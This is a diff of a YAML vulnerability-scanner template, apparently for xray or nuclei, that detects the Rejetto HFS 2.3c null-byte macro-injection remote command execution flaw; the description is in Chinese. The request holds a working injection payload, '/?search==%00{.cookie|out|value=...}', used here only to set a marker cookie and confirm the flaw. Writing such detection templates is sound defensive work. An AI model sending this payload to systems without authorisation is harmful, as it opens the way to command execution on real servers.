@@ -1,37 +1,28 @@
-expression: r0()
 id: hfs-rce
+
 info:
+  name: HFS 远程命令执行漏洞
   author: laohuan12138
-  description: "HTTP File Server\u662F\u4E00\u6B3E\u4E13\u4E3A\u4E2A\u4EBA\u7528\u6237\
-    \u6240\u8BBE\u8BA1\u7684HTTP\u6587\u4EF6\u670D\u52A1\u5668\uFF0C\u5B83\u63D0\u4F9B\
-    \u865A\u62DF\u6863\u6848\u7CFB\u7EDF\uFF0C\u652F\u6301\u65B0\u589E\u3001\u79FB\
-    \u9664\u865A\u62DF\u6863\u6848\u8D44\u6599\u5939\u7B49\u3002\nRejetto HTTP File\
-    \ Server 2.3c\u53CA\u4E4B\u524D\u7248\u672C\u4E2D\u7684parserLib.pas\u6587\u4EF6\
-    \u4E2D\u7684\u2018findMacroMarker\u2019\u51FD\u6570\u4E2D\u5B58\u5728\u5B89\u5168\
-    \u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u6E90\u4E8EparserLib.pas\u6587\u4EF6\u6CA1\
-    \u6709\u6B63\u786E\u5904\u7406\u7A7A\u5B57\u8282\u3002\u8FDC\u7A0B\u653B\u51FB\
-    \u8005\u53EF\u501F\u52A9\u641C\u7D22\u64CD\u4F5C\u4E2D\u7684\u2018%00\u2019\u5E8F\
-    \u5217\u5229\u7528\u8BE5\u6F0F\u6D1E\u6267\u884C\u4EFB\u610F\u7A0B\u5E8F\u3002\
-    \ product=\"HFS\"\n"
-  name: "HFS \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
-  reference:
-  - https://www.shuzhiduo.com/A/Ae5RqXBmJQ/
   severity: high
   verified: true
+  description: |-
+    HTTP File Server是一款专为个人用户所设计的HTTP文件服务器，它提供虚拟档案系统，支持新增、移除虚拟档案资料夹等。
+    Rejetto HTTP File Server 2.3c及之前版本中的parserLib.pas文件中的‘findMacroMarker’函数中存在安全漏洞，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的‘%00’序列利用该漏洞执行任意程序。 product="HFS"
+  reference:
+    - https://www.shuzhiduo.com/A/Ae5RqXBmJQ/
+  tags: hfs,rce
+  created: 2023/09/02
+
+set:
+  randomword: randomLowercase(8)
+  hostname: request.url.host
 rules:
   r0:
-    expression: response.status == 200 && response.raw_header.bcontains(bytes(randomword))
     request:
-      raw: 'GET /?search==%00{.cookie|out|value%3d{{randomword}}.}
-
+      raw: |
+        GET /?search==%00{.cookie|out|value%3d{{randomword}}.}
         Host: {{hostname}}
-
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101
-        Firefox/99.0
-
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
         Content-Type: application/x-www-form-urlencoded
-
-        '
-set:
-  hostname: request.url.host
-  randomword: randomLowercase(8)
+    expression: response.status == 200 && response.raw_header.bcontains(bytes(randomword))
+expression: r0()
